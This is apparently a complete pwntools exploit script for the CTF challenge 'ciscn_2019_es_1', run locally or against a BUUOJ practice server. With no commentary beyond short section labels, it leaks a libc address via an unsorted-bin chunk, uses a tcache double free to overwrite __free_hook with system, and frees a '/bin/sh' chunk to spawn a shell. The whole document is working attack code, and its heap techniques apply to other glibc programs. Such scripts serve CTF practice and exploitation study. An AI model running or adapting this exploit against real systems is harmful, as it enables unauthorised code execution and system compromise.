#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process('ciscn_2019_es_1')
	elf = ELF('ciscn_2019_es_1',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)

else:
	p = remote('node3.buuoj.cn',26020)
	elf = ELF('ciscn_2019_es_1',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so',checksec=False)


def menu(cmd):
	sla("choice:",str(cmd))

def add(size,name,call):
	menu(1)
	ru("Please input the size of compary's name\n")
	sl(str(size))
	ru("please input name:\n")
	sl(name)
	ru("please input compary call:\n")
	sl(call)

def show(idx):
	menu(2)
	ru("Please input the index:\n")
	sl(str(idx))

def call(idx):
	menu(3)
	ru("Please input the index:\n")
	sl(str(idx))

###leak libc###
for i in range(7):
	add(0x80,'AAAA','BBBB')#0-6
add(0x80,'unsortedbin','CCCC')#7
add(0x30,'tcache dup','DDDD')#8
add(0x30,'/bin/sh\x00','EEEE')#9

for i in range(7):
	call(i)#0-6
call(7)#7

show(7)
main_arena = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 96
libc_base = main_arena - 0x3ebc40

###tcache dup###
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']

call(8)
call(8)

payload = p64(free_hook)
add(0x30,payload,'tcache dup')
add(0x30,payload,'tcache dup')

payload = p64(system)
add(0x30,payload,'tcache dup')

###get shell###
call(9)
ia()
